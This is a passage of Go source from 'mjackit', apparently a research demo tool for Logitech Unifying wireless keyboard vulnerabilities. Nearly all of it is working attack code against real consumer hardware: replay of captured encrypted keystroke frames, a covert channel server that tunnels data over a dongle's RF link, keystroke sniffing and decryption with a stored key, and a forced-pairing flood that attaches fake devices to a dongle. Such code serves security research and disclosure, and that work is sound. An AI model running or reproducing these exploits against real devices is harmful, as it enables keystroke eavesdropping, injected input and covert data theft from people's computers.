		//payStr := fmt.Sprintf("%02X", pay)
		//fmt.Printf("%-11.4f %-44s    %s (len %d)\n", float32(frameTime) / 1e6, payStr, class, len(pay))

		if storedCount >= maxStore {
			return false //abort if enough reports stored
		}

		if class == unifying.FT_KEYBOARD_ENCRYPTED && lastType == unifying.FT_SET_KEEP_ALIVE {
			counter := binary.BigEndian.Uint32(pay[10:14])
			if counter == lastCounter+1 {
				fmt.Printf("STORED %d Key down counter %d: % 02x\n", storedCount, counter, pay)
				storedReport[storedCount] = reportEntry{
					dt:  frameTimeDuration,
					rep: pay,
				}
				storedCount++
			} else {
				storedCount = 0
			}

			lastCounter = counter
		} else if lastType == unifying.FT_KEYBOARD_ENCRYPTED && class == unifying.FT_SET_KEEP_ALIVE {
			//assure first stored report is key down

			counter := binary.BigEndian.Uint32(lastPay[10:14])
			if counter == lastCounter+1 && storedCount != 0 {
				fmt.Printf("STORED %d Key release counter %d: % 02x\n", storedCount, counter, lastPay)
				storedReport[storedCount] = reportEntry{
					dt:  lastTimeDelta,
					rep: lastPay,
				}
				storedCount++
			} else {
				storedCount = 0
			}

			lastCounter = counter
		}

		lastPay = pay
		lastType = class
		lastTimeDelta = frameTimeDuration

		return true
	}

	lt.CaptureDevice(context.Background(), knownDev, false, []unifying.RFFrameType{unifying.FT_SET_KEEP_ALIVE, unifying.FT_KEYBOARD_ENCRYPTED, unifying.FT_LED_REPORT}, callback)

	for _, stored := range storedReport {
		time.Sleep(8 * time.Millisecond)
		lt.Nrf24.TransmitPayload(stored.rep, 2, 15)
	}

}


const (
	COVERT_CHANNEL_OFFSET_FIELD_DEVICE_INDEX      = 0x00
	COVERT_CHANNEL_OFFSET_FIELD_RF_REPORT_TYPE    = 0x01
	COVERT_CHANNEL_OFFSET_FIELD_RF_DESTINATION_ID = 0x02
	COVERT_CHANNEL_OFFSET_FIELD_MARKER            = 0x03
	COVERT_CHANNEL_OFFSET_FIELD_BITMASK           = 0x04
	COVERT_CHANNEL_OFFSET_PAYLOAD                 = 0x05

	COVERT_CHANNEL_FIELD_MARKER_MASK_CONTROL_FRAME  = 0x01
	COVERT_CHANNEL_FIELD_MARKER_SHIFT_CONTROL_FRAME = 0

	COVERT_CHANNEL_FIELD_BITMASK_MASK_PAYLOAD_LENGTH = 0xf0
	COVERT_CHANNEL_FIELD_BITMASK_MASK_CONTROL_TYPE   = 0xf0
	COVERT_CHANNEL_FIELD_BITMASK_MASK_SEQ            = 0x03
	COVERT_CHANNEL_FIELD_BITMASK_MASK_ACK            = 0x0c

	COVERT_CHANNEL_FIELD_BITMASK_SHIFT_PAYLOAD_LENGTH = 4
	COVERT_CHANNEL_FIELD_BITMASK_SHIFT_CONTROL_TYPE   = 4
	COVERT_CHANNEL_FIELD_BITMASK_SHIFT_SEQ            = 0
	COVERT_CHANNEL_FIELD_BITMASK_SHIFT_ACK            = 2

	COVERT_CHANNEL_MARKER = 0xba

	COVERT_CHANNEL_SEQUENCE_NUMBER_COUNT = 4

	COVERT_CHANNEL_RF_REPORT_ID_HIDPP_LONG          = 0x11
	COVERT_CHANNEL_RF_REPORT_ID_HIDPP_SHORT         = 0x10
	COVERT_CHANNEL_RF_REPORT_ID_MASK_KEEP_ALIVE_BIT = 0x40

	COVERT_CHANNEL_MAX_PAYLOAD_LENGTH = 16

	COVERT_CHANNEL_CONTROL_TYPE_MAXIMUM_PAYLOAD_LENGTH_FRAME = 0x0

	COVERT_CHANNEL_MAX_TX_QUEUE_COUNT = 8
)

type CovertChannel struct {
	lt       *unifying.Logitacker
	rfDevice *unifying.LogitackerDevice

	LastTxSeq byte
	LastRxSeq byte
	Marker    byte

	txDataFIFO chan []byte
	txInterval time.Duration

	//rfDeviceIndex   byte
	rfDestinationID byte

	rfOut []byte
	rfKeepAlive []byte
	rfIn []byte

	debug bool
}

// The dongle is constantly sending, if the client agent is running
// purpose of init function is to grab the sequence number in use
func (cc *CovertChannel) Initialize() {
	cc.lt.Nrf24.SetDebug(cc.debug)

	rfOut := make([]byte, 22)

	rfOut[1] = COVERT_CHANNEL_RF_REPORT_ID_HIDPP_LONG | COVERT_CHANNEL_RF_REPORT_ID_MASK_KEEP_ALIVE_BIT
	rfOut[2] = cc.rfDestinationID
	rfOut[3] = cc.Marker

	cc.lt.Nrf24.EnterSnifferMode(cc.rfDevice.RfAddress, true)

	for {
		unifying.LogitechChecksum(rfOut)
		ackPay, eAck := cc.lt.Nrf24.TransmitPayload(rfOut, 5, 1)
		if eAck == nil {
			if cc.debug {
				fmt.Printf("TX: % 02x\n", rfOut)
			}
			if len(ackPay) > 1 {
				//Only transmit new frame if ack payload was received
				if cc.debug {
					fmt.Printf("RX: % 02x\n", ackPay)
				}

				if len(ackPay) == 22 &&
					ackPay[1] == COVERT_CHANNEL_RF_REPORT_ID_HIDPP_LONG && (ackPay[3] == cc.Marker || ackPay[3] == cc.Marker | COVERT_CHANNEL_FIELD_MARKER_MASK_CONTROL_FRAME) {
					//seems to be valid cover channel comms, extract sequence number

					cc.LastRxSeq = (ackPay[COVERT_CHANNEL_OFFSET_FIELD_BITMASK] & COVERT_CHANNEL_FIELD_BITMASK_MASK_SEQ) >> COVERT_CHANNEL_FIELD_BITMASK_SHIFT_SEQ
					//adjust to previous seq
					if cc.LastRxSeq > 0 {
						cc.LastRxSeq--
					} else {
						cc.LastRxSeq = COVERT_CHANNEL_SEQUENCE_NUMBER_COUNT-1
					}

					cc.LastTxSeq = (ackPay[COVERT_CHANNEL_OFFSET_FIELD_BITMASK] & COVERT_CHANNEL_FIELD_BITMASK_MASK_ACK) >> COVERT_CHANNEL_FIELD_BITMASK_SHIFT_ACK

					//cc.DebugOut(fmt.Sprintf("covert channel RF frame spotted: % 02x seq number: %02x\n", ackPay, cc.LastRxSeq))
					fmt.Printf("covert channel RF synced ... current tx seq %02x, last rx seq %02x\n", cc.LastTxSeq, cc.LastRxSeq)
					return
				}
				//break
				//wait 8 ms before retry to send


			}
			time.Sleep(cc.txInterval)
		} else {
			for {
				ch, eCh := cc.lt.FindDevice(context.Background(), cc.rfDevice.RfAddress)
				if eCh == nil {
					if cc.debug {
						fmt.Printf("Dongle found on channel %d %v\n", ch, eCh)
					}
					break;
				}
			}
		}

	}
}

func (cc *CovertChannel) ParseRFIn(rawRfInData []byte) (deviceIndexRF byte, isControl bool, rxSeq byte, rxAck byte, rxPayload []byte, err error) {

	if len(rawRfInData) != 22 {
		err = errors.New("invalid length for covert channel frame")
		return
	}
	if rawRfInData[COVERT_CHANNEL_OFFSET_FIELD_RF_REPORT_TYPE] != COVERT_CHANNEL_RF_REPORT_ID_HIDPP_LONG {
		err = errors.New("invalid report type for covert channel frame")
		return
	}
	if rawRfInData[COVERT_CHANNEL_OFFSET_FIELD_MARKER] != cc.Marker && rawRfInData[COVERT_CHANNEL_OFFSET_FIELD_MARKER] != cc.Marker | COVERT_CHANNEL_FIELD_MARKER_MASK_CONTROL_FRAME {
		err = errors.New("invalid marker byte for covert channel frame")
		return
	}

	deviceIndexRF = rawRfInData[COVERT_CHANNEL_OFFSET_FIELD_DEVICE_INDEX]
	fieldBitmask := rawRfInData[COVERT_CHANNEL_OFFSET_FIELD_BITMASK]
	fieldMarker := rawRfInData[COVERT_CHANNEL_OFFSET_FIELD_MARKER]
	isControl = false
	if fieldMarker & COVERT_CHANNEL_FIELD_MARKER_MASK_CONTROL_FRAME > 0 {
		isControl = true
	}

	payLen := fieldBitmask >> COVERT_CHANNEL_FIELD_BITMASK_SHIFT_PAYLOAD_LENGTH
	controlType := byte(0)
	if isControl {
		controlType = fieldBitmask >> COVERT_CHANNEL_FIELD_BITMASK_SHIFT_CONTROL_TYPE
		switch controlType  {
		case COVERT_CHANNEL_CONTROL_TYPE_MAXIMUM_PAYLOAD_LENGTH_FRAME:
			payLen = 16
		}
	}

	rxSeq = (fieldBitmask & COVERT_CHANNEL_FIELD_BITMASK_MASK_SEQ) >> COVERT_CHANNEL_FIELD_BITMASK_SHIFT_SEQ
	rxAck = (fieldBitmask & COVERT_CHANNEL_FIELD_BITMASK_MASK_ACK) >> COVERT_CHANNEL_FIELD_BITMASK_SHIFT_ACK



	rxPayload = rawRfInData[5 : 5 + payLen]

	if isControl {
		controlType := payLen
		switch controlType {
		case COVERT_CHANNEL_CONTROL_TYPE_MAXIMUM_PAYLOAD_LENGTH_FRAME:
			rxPayload = rawRfInData[5:21]
		}
	}

	return
}


func (cc *CovertChannel) SendData(data []byte) {
	// slice data into fragments if needed
	for len(data) > 0 {
		if len(data) > COVERT_CHANNEL_MAX_PAYLOAD_LENGTH {
			cc.txDataFIFO <- data[:COVERT_CHANNEL_MAX_PAYLOAD_LENGTH]
			data = data[COVERT_CHANNEL_MAX_PAYLOAD_LENGTH:]
		} else {
			cc.txDataFIFO <- data
			data = data[0:0]
		}
	}
}

func (cc *CovertChannel) DebugOut(s string) {
	if cc.debug {
		fmt.Print(s)
	}
}

func (cc *CovertChannel) Run() {
	cc.lt.Nrf24.EnterSnifferMode(cc.rfDevice.RfAddress, true)
	cc.lt.Nrf24.SetDebug(false)

	ch, eCh := cc.lt.FindDevice(context.Background(), cc.rfDevice.RfAddress)
	if eCh == nil {
		cc.DebugOut(fmt.Sprintln("Found device on channel", ch))
	} else {
		log.Fatal("Covert channel device not found")
	}

	fmt.Println("... covert channel server running")
	cc.rfOut = make([]byte, 22)

	cc.rfOut[COVERT_CHANNEL_OFFSET_FIELD_DEVICE_INDEX] = 0x00
	cc.rfOut[COVERT_CHANNEL_OFFSET_FIELD_RF_REPORT_TYPE] = COVERT_CHANNEL_RF_REPORT_ID_HIDPP_LONG | COVERT_CHANNEL_RF_REPORT_ID_MASK_KEEP_ALIVE_BIT
	cc.rfOut[COVERT_CHANNEL_OFFSET_FIELD_RF_DESTINATION_ID] = cc.rfDestinationID
	cc.rfOut[COVERT_CHANNEL_OFFSET_FIELD_MARKER] = cc.Marker

	outPayloadLength := 0
	cc.rfOut[COVERT_CHANNEL_OFFSET_FIELD_BITMASK] = cc.LastTxSeq << COVERT_CHANNEL_FIELD_BITMASK_SHIFT_SEQ
	cc.rfOut[COVERT_CHANNEL_OFFSET_FIELD_BITMASK] |= cc.LastRxSeq << COVERT_CHANNEL_FIELD_BITMASK_SHIFT_ACK
	cc.rfOut[COVERT_CHANNEL_OFFSET_FIELD_BITMASK] |= byte(outPayloadLength) << COVERT_CHANNEL_FIELD_BITMASK_SHIFT_CONTROL_TYPE

	unifying.LogitechChecksum(cc.rfOut)


	//printBuffer := []byte{}
	txPayload := []byte{}
	txPayloadLength := len(txPayload)
	txIsControlFrame := false
	txControlFrameType := byte(COVERT_CHANNEL_CONTROL_TYPE_MAXIMUM_PAYLOAD_LENGTH_FRAME)


	rfOut := cc.rfOut

	//outer loop: transmit endless, send pending data on each iteration or empty payload if no data pending
	RFLoop:
	for {
		//Transmit RF output frame, till input is received
		//Inner loop: transmit till data with valid ack has been received

		retransmitCounter := 0
	RetransmitLoop:
		for {
			if retransmitCounter == 0 {
				rfOut = cc.rfOut
			} else {
				rfOut = cc.rfKeepAlive
			}
			retransmitCounter++
			retransmitCounter %= 4

//			rfIn, eAck := cc.lt.nrf24.TransmitPayload(cc.rfOut, 5, 2)
			rfIn, eAck := cc.lt.Nrf24.TransmitPayload(rfOut, 5, 2)
			if eAck == nil { //Acknowledge error
				if len(rfIn) == 22 { //Ack payload was received
					//cc.DebugOut(fmt.Sprintf("TX: % 02x\n", cc.rfOut))
					cc.DebugOut(fmt.Sprintf("TX: % 02x\n", rfOut))
					cc.rfIn = rfIn
					cc.DebugOut(fmt.Sprintf("RX: % 02x\n", cc.rfIn))
					break RetransmitLoop
				}

				//after successful TX we switch over to keep alive
				//rfOut = cc.rfKeepAlive

				// delay next tx by interval which is set
				time.Sleep(cc.txInterval)

			} else {
				// Transmission failed on RF layer, find correct channel again
			ChannelSearchLoop:
				for {
					ch, eCh := cc.lt.FindDevice(context.Background(), cc.rfDevice.RfAddress)
					if eCh == nil {
						cc.DebugOut(fmt.Sprintf("Dongle found on channel %d %v\n", ch, eCh))
						break ChannelSearchLoop // abort channel search if found
					}
				}
				//fmt.Printf(".")

			}
		}


		//Parse RF inbound data
		deviceIndex, rxIsControlFrame, rxSeq, rxAck, rxPayload, eParse := cc.ParseRFIn(cc.rfIn)
		if eParse != nil {
			//Invalid inbound data
			cc.DebugOut(fmt.Sprint(eParse))
			continue RFLoop
		}
		cc.DebugOut(fmt.Sprintf("RX: devIdx %02x, control frame: %v, seq no: %d ack no: %d, rfOut: %+q\n", deviceIndex, rxIsControlFrame, rxSeq, rxAck, string(rxPayload)))

		//check if there's new inbound data (rxSeq Incremented)
		rxSeqNext := (cc.LastRxSeq + 1) % COVERT_CHANNEL_SEQUENCE_NUMBER_COUNT
		if rxSeq == rxSeqNext {
			cc.DebugOut(fmt.Sprintf("New inbound data: '%+q'\n", string(rxPayload)))
			if len(rxPayload) > 0 {
				fmt.Printf(string(rxPayload))
			}

			cc.LastRxSeq = rxSeq

			// toggle back tx data from keep-alive to full payload
			rfOut = cc.rfOut


			/*
			//acumulate data if max payload length, till packet of length < 16 arrives
			printBuffer = append(printBuffer, rxPayload...)
			if len(rxPayload) < 16 && len(printBuffer) > 0 {
				fmt.Println(string(printBuffer))
				printBuffer = printBuffer[:0]
			}
			*/
		}

		// check if new outbound data could be sent (valid ack for last TX)
		if rxAck == cc.LastTxSeq {

			// Update TX payload (pop data from tx queue, if not empty)
			// Note: we don't block if no data has to be sent, but continue sending empty payloads
			//       otherwise we wouldn't be able to receive pending ack payloads from dongle
			if len(cc.txDataFIFO) > 0 {
				txPayload = <- cc.txDataFIFO
			} else {
				txPayload = []byte{} //empty payload
			}

			//update payload length
			txPayloadLength = len(txPayload)

			//account for sepecial case of maximum payload length, which is indicated by a control frame
			if txPayloadLength >= COVERT_CHANNEL_MAX_PAYLOAD_LENGTH {
				txPayload = txPayload[:COVERT_CHANNEL_MAX_PAYLOAD_LENGTH] //truncate if needed
				txIsControlFrame = true
				txControlFrameType = COVERT_CHANNEL_CONTROL_TYPE_MAXIMUM_PAYLOAD_LENGTH_FRAME
			} else {
				txIsControlFrame = false
			}

			//update seq no
			cc.LastTxSeq++
			cc.LastTxSeq %= COVERT_CHANNEL_SEQUENCE_NUMBER_COUNT
			cc.DebugOut(fmt.Sprintf("New outbound data: '%s'\n", string(txPayload)))

			// toggle back tx data from keep-alive to full payload
			rfOut = cc.rfOut
		}

		// update rfOut frame

		// adjust bitmask and marker field
		cc.rfOut[COVERT_CHANNEL_OFFSET_FIELD_BITMASK] = cc.LastTxSeq << COVERT_CHANNEL_FIELD_BITMASK_SHIFT_SEQ
		cc.rfOut[COVERT_CHANNEL_OFFSET_FIELD_BITMASK] |= cc.LastRxSeq << COVERT_CHANNEL_FIELD_BITMASK_SHIFT_ACK
		if txIsControlFrame {
			// special case, needs to be transmitted as control frame
			cc.rfOut[COVERT_CHANNEL_OFFSET_FIELD_MARKER] |= COVERT_CHANNEL_FIELD_MARKER_MASK_CONTROL_FRAME  //enable control frame bit
			cc.rfOut[COVERT_CHANNEL_OFFSET_FIELD_BITMASK] |= txControlFrameType << COVERT_CHANNEL_FIELD_BITMASK_SHIFT_PAYLOAD_LENGTH
		} else {
			cc.rfOut[COVERT_CHANNEL_OFFSET_FIELD_MARKER] &= (COVERT_CHANNEL_FIELD_MARKER_MASK_CONTROL_FRAME ^ byte(0xff)) //disable control frame bit
			cc.rfOut[COVERT_CHANNEL_OFFSET_FIELD_BITMASK] |= byte(txPayloadLength) << COVERT_CHANNEL_FIELD_BITMASK_SHIFT_CONTROL_TYPE
		}

		//clear previous payload data
		for i:=COVERT_CHANNEL_OFFSET_PAYLOAD; i<COVERT_CHANNEL_OFFSET_PAYLOAD+COVERT_CHANNEL_MAX_PAYLOAD_LENGTH; i++ {
			cc.rfOut[i] = 0x00
		}

		//insert new payload data
		copy(cc.rfOut[COVERT_CHANNEL_OFFSET_PAYLOAD:], txPayload)

		// re-calculate CRC byte
		unifying.LogitechChecksum(cc.rfOut)

		// delay next tx by interval which is set
		time.Sleep(cc.txInterval)

	}
}

func NewCovertChannel(logitacker *unifying.Logitacker, device *unifying.LogitackerDevice, txInterval time.Duration) (res *CovertChannel, err error) {
	if len(device.RfAddress) != 5 {
		err = errors.New("invalid device RF address")
		return
	}

	res = &CovertChannel{
		lt:              logitacker,
		rfDevice:        device,
		rfDestinationID: device.RfAddress[4],
		//rfDeviceIndex:   deviceIndex,
		Marker:     COVERT_CHANNEL_MARKER,
		LastTxSeq:  0,
		LastRxSeq:  0,
		txDataFIFO: make(chan []byte, COVERT_CHANNEL_MAX_TX_QUEUE_COUNT),
		txInterval: txInterval,
		debug:      true,
	}

	rfKeepAlive := []byte{0x00, 0x40, 0x00, 0x08, 0x00}
	//rfKeepAlive := []byte{0x00, 0x4f, 0x00, 0x01, 0x16, 0x00, 0x00, 0x00, 0x00, 0x9a}
	unifying.LogitechChecksum(rfKeepAlive)
	res.rfKeepAlive = rfKeepAlive

	return
}

func TestCovertChannel(addrStr string) {
	lt, _ := unifying.NewLogitacker()



	addr,eAddr := unifying.ParseNrf24Addr(addrStr)
	if eAddr != nil {
		fmt.Printf("Invalid device address: %s\n", addrStr)
		return
	}

	fmt.Printf("launching covert channel server for target RF address %s", addrStr)

	knownDev := &unifying.LogitackerDevice{}
	//knownDev.RfAddress = Nrf24Addr{0xe2, 0xc7, 0x94, 0xf2, 0x4c}
	knownDev.RfAddress = addr

	//knownDev.SetKey([]byte{0x08, 0x38, 0xe2, 0xf2, 0xe4, 0x6b, 0x86, 0xa7, 0x75, 0x88, 0x17, 0x04, 0x8a, 0x35, 0x40, 0x8e})

	cc, err := NewCovertChannel(lt, knownDev, time.Millisecond * 10)
	cc.debug = false
	if err == nil {
		cc.Initialize()
		go cc.Run()

		scanner := bufio.NewScanner(os.Stdin)

		for scanner.Scan() {
			//fmt.Println(">")
			cc.SendData([]byte(scanner.Text() + "\n"))
		}
	} else {
		log.Fatal("error creating covert channel server %v", err)
	}
}

func TestSniffStored(filename string) {
	si, err := unifying.LoadSetInfoFromFile(filename)
	if err == nil {
		fmt.Println(si.String())
	}

	if si.Dongle.NumConnectedDevices == 0 {
		fmt.Println("Dongle has no device connected, which could be used")
		return
	}

	devToUse := si.ConnectedDevices[0]

	if si.Dongle.NumConnectedDevices > 1 {
		fmt.Println("Multiple devices connected to target dongle, select device to use...")

		options := make([]string, si.Dongle.NumConnectedDevices)
		for i, d := range si.ConnectedDevices {
			options[i] = fmt.Sprintf("%02x:%02x:%02x:%02x:%02x %s '%s')", d.RFAddr[0], d.RFAddr[1], d.RFAddr[2], d.RFAddr[3], d.RFAddr[4], d.DeviceType.String(), d.Name)
		}

		var selected int
		for {
			s, eS := helper.Select("choose device to sniff: ", options)
			if eS != nil {
				fmt.Println(eS)
			} else {
				selected = s
				break
			}
		}

		devToUse = si.ConnectedDevices[selected]

	}

	fmt.Println("Start sniffing (decrypting with stored key)...")

	//fmt.Println(devToUse.String())

	knownDev := &unifying.LogitackerDevice{}

	knownDev.RfAddress = unifying.Nrf24Addr(devToUse.RFAddr)
	if len(devToUse.Key) == 16 {
		knownDev.SetKey(devToUse.Key)
	}

	lt, _ := unifying.NewLogitacker()
	lt.SniffDeviceKeybuff(context.Background(), knownDev, true, []unifying.RFFrameType{unifying.FT_INVALID_CHKSM, unifying.FT_NOTIFICATION_KEEP_ALIVE, unifying.FT_SET_KEEP_ALIVE})
	//lt.SniffDeviceKeybuff(context.Background(), knownDev, false, []unifying.RFFrameType{unifying.FT_KEYBOARD_ENCRYPTED, unifying.FT_LED_REPORT})

}

func TestPairFlooding() {
	//*** Forced Pairing PoC tested against Dongle Firmware 12.01.0019 (outdated, but the one I was actually using myself)
	// German saying: Der Schuster trägt die schlechtesten Schuhe ;-)
	nrf24, err := unifying.NewNRF24()
	defer nrf24.Close()
	if err != nil {
		panic(err)
	}

	nrf24.EnableLNA()

	devTypes := []unifying.LogitechDeviceType{
		unifying.LOGITECH_DEVICE_KEYBOARD,
		unifying.LOGITECH_DEVICE_MOUSE,
		unifying.LOGITECH_DEVICE_NUMPAD,
		unifying.LOGITECH_DEVICE_PRESENTER,
		unifying.LOGITECH_DEVICE_REMOTE,
		unifying.LOGITECH_DEVICE_TRACKBALL,
		unifying.LOGITECH_DEVICE_TOUCHPAD,
		unifying.LOGITECH_DEVICE_TABLET,
		unifying.LOGITECH_DEVICE_GAMEPAD,
		unifying.LOGITECH_DEVICE_JOYSTICK,
	}

	i := byte(0)
	for {
		i++
		devName := "MaMe82"
		devType := devTypes[i % byte(len(devTypes))]
		devCaps := /*unifying.LOGITECH_DEVICE_CAPS_LINK_ENCRYPTION | */unifying.LOGITECH_DEVICE_CAPS_UNIFYING_COMPATIBLE
		devReportTypes := unifying.LOGITECH_DEVICE_REPORT_TYPES_MOUSE | unifying.LOGITECH_DEVICE_REPORT_TYPES_KEYBOARD | unifying.LOGITECH_DEVICE_REPORT_TYPES_KEYBOARD_LED | unifying.LOGITECH_DEVICE_REPORT_TYPES_POWER_KEYS
		//devCaps := LOGITECH_DEVICE_CAPS_UNIFYING_COMPATIBLE
		//devSerial := []byte{0x01, 0x01, 0x01, 0x07}
		devSerial := []byte{0x01, 0x01, 0x01, i}
		//rand.Read(devSerial[1:])
		devNonce := []byte{0xBB, 0xBB, 0xBB, 0xBB} //Only used when CAPS_LINK_ENCRYPTION is set on real device ??
		pairingAddr := SimulatePairingDevice(nrf24, devName, devType, devCaps, devSerial, devNonce, devReportTypes)

		fmt.Println("Paired to", pairingAddr.String())
		time.Sleep(1 * time.Second)

	}

}

func main() {
	fmt.Println("=============================================================")
	fmt.Println("=                         - mjackit -                       =")
	fmt.Println("=                                                           =")
	fmt.Println("=      Demo tool for Logitech Unifying vulnerabilities      =")
	fmt.Println("=           by Marcus Mengs (MaMe82) Feb, 2019              =")
	fmt.Println("=============================================================")


	// worst arg parsing ever, extended for every f**king demo
	// Cobra (used in P4wnP1_cli) could come to help for a neat arg parser
	if len(os.Args) > 1 {
		arg := os.Args[1]
		if strings.Contains(arg, "discoversniff") {
			TestUnknownSniff()
		}
		if strings.Contains(arg, "pairsniff") { // PoC 1
			// Tries to sniff a pairing. Follows device on success and decrypts keyboard RF frames to stdout
			// Additionally fills and prints an ASCII buffer for demo purposes (very naive, translates alpha HID key
			// codes to ASCII, applies upper case for SHIFT modifier, backspace/tab/return influence the keybuffer)
			TestPairSniff(true)
		}
		if strings.Contains(arg, "xorinject") { //PoC 2
			outstring := "CyberAwareness encrypted keystroke injection demo by MaMe82\nThis injection contains more keys than stored frames"
			if len(os.Args) > 2 {
				outstring = strings.Join(os.Args[2:], " ")
			}
			TestSniffReplayXOR(false, outstring, "de") //change laguage layout if needed
		}
		if strings.Contains(arg, "file") { // PoC 3
			if len(os.Args) < 3 {
				fmt.Println("no filename provided")
				return
			}
			TestSniffStored(os.Args[2])
		}
		if strings.Contains(arg, "covertauto2") { // PoC 4
			fmt.Println("Waiting for device keystrokes to deploy covert channel...\n")
			TestSniffReplayXORCovertChannelAgent2(false, "de") //change laguage layout if needed
		} else if strings.Contains(arg, "covertauto") { // PoC 4
			fmt.Println("Waiting for device keystrokes to deploy covert channel...\n")
			TestSniffReplayXORCovertChannelAgent(false, "de") //change laguage layout if needed
		}
		if strings.Contains(arg, "covert") { // PoC 4
			//fmt.Println("Launching covert channel server")
			if len(os.Args) == 2 {
				TestCovertChannel("e2:c7:94:f2:4c")
				return
			} else if len(os.Args) >= 3 {
				TestCovertChannel(os.Args[2])
			}
		}
		if strings.Contains(arg, "pairflood") {
			fmt.Println("each time a dongle is put into pairing mode, a new device will be paired immediately")
			TestPairFlooding()
		}
	}

	//TestFTCapture()

	TestUnknownSniff()

	//TestKeystrokeInjection()

	TestCovertChannel("e2:c7:94:f2:4c")

	//TestSniffExisting()
	//TestKeyCreation()
	//TestPairSniff()
	//TestSniffReplayXOR(false)
	return

	//AESBrute()


	nrf24, err := unifying.NewNRF24()
	defer nrf24.Close()
	if err != nil {
		panic(err)
	}

	nrf24.EnableLNA()

	//	TestSniffEncryptedKeyboard()

	//Fuzz keyboard
	//	TestInjectEncryptedRFFramesEmulateKeyboard(nrf24, Nrf24Addr{0x77, 0x82, 0x9a, 0x07, 0x1c})

	//TEST
	// Valid pairing channels: 5, 8, 11
	SimulatePairingDongle(nrf24, 41)


	return

	//Signal handler
	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt)
	go func() {
		select {
		case <-c:
			os.Exit(0)
		}
	}()

}
